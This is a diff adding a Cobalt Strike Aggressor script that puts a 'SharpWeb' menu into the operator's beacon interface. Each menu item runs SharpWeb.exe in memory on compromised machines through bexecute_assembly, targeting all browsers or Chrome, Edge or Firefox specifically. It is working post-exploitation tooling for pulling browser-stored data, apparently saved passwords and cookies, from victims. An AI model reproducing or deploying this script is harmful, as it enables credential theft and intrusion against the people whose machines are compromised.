@@ -1,0 +1,51 @@
+menu "SharpWeb" {
+
+		item "Retrieve All Browsers' Data"{
+			local('$bid');
+				foreach $bid ($1){
+					sharpweball($bid);
+				}
+			}
+
+		item "Retrieve Chrome Data"{
+			local('$bid');
+				foreach $bid ($1){
+					sharpwebchrome($bid);
+				}
+			}
+
+		item "Retrieve Edge Data"{
+			local('$bid');
+				foreach $bid ($1){
+					sharpwebedge($bid);
+				}
+			}
+		item "Retrieve FireFox Data"{
+			local('$bid');
+				foreach $bid ($1){
+					sharpwebfirefox($bid);
+				}
+			}
+		} #End of SharpWeb Menu
+
+###
+###SharpWeb Functions
+####SharpWeb All
+sub sharpweball{
+bexecute_assembly($1, script_resource('/exe/SharpWeb.exe'), "all");
+}
+
+####SharpWeb FireFox
+sub sharpwebfirefox{
+bexecute_assembly($1, script_resource('/exe/SharpWeb.exe'), "firefox");
+}
+
+####SharpWeb Chrome
+sub sharpwebchrome{
+bexecute_assembly($1, script_resource('/exe/SharpWeb.exe'), "chrome");
+}
+
+####SharpWeb Edge
+sub sharpwebedge{
+bexecute_assembly($1, script_resource('/exe/SharpWeb.exe'), "edge");
+}
